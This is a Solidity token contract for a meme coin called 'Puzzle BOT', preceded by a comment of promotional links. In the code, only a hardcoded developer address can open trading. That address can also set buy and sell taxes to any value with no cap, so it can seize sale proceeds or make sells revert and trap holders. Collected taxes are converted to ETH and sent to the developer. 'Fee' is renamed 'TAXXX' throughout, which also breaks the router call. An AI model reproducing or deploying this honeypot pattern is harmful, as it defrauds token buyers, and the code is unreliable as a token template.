/*
The Puzzle BOT $PZ🧩

Welcome to The Puzzle BOT $PZ🧩 is being protected by @SafeguardRobot


Telegram: https://t.me/ThePuzzleBot

X: X.com/Thepuzzlecoin

Website: http://puzzlebot.pro/

Bots: 
https://t.me/PuzzleLpBot

https://t.me/Puzzleinspectorbot

*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.15;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTAXXXOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract PUZZLE {
        

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

        string public   name_ = "Puzzle BOT"; 
        string public   symbol_ = "PUZZLE";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 100000000 * 10**decimals;

        uint256 buyTAXXX = 0;
        uint256 sellTAXXX = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();
        
        
    
        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed Devv,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant Devv = payable(address(0x4b690a15cE9eF37d37AEB94e9fBD7cc989fb379a));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == Devv || to == Devv);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTAXXXOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                Devv.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TAXXXAmount = amount * (from == pair ? buyTAXXX : sellTAXXX) / 100;
                amount -= TAXXXAmount;
                balanceOf[address(this)] += TAXXXAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == Devv);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setTAXXX(uint256 _buy, uint256 _sell) private {
            buyTAXXX = _buy;
            sellTAXXX = _sell;
        }

        function setTAXXX(uint256 _buy, uint256 _sell) external {
            if(msg.sender != Devv)        
                revert Permissions();
            _setTAXXX(_buy, _sell);
        }
    }